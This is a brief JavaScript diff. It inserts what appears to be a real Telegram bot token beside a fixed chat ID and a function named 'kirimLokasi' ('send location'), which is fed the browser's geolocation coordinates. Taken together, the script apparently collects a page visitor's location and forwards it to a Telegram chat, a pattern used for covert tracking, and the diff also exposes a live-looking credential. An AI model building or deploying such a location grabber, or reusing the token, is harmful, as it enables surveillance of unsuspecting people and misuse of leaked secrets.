@@ -1,4 +1,4 @@
-const token = "TOKEN_BOT_KAMU";
+const token = "8263999601:AAHWjwvSPrSk4URDgvPLAqGAvfLl_wuHLdE";
 const chat_id = "8334910422";
 
 function kirimLokasi(lat, lon) {
@@ -35,3 +35,4 @@ const lon = pos.coords.longitude;
 kirimLokasi(lat,lon);
 
 });
+
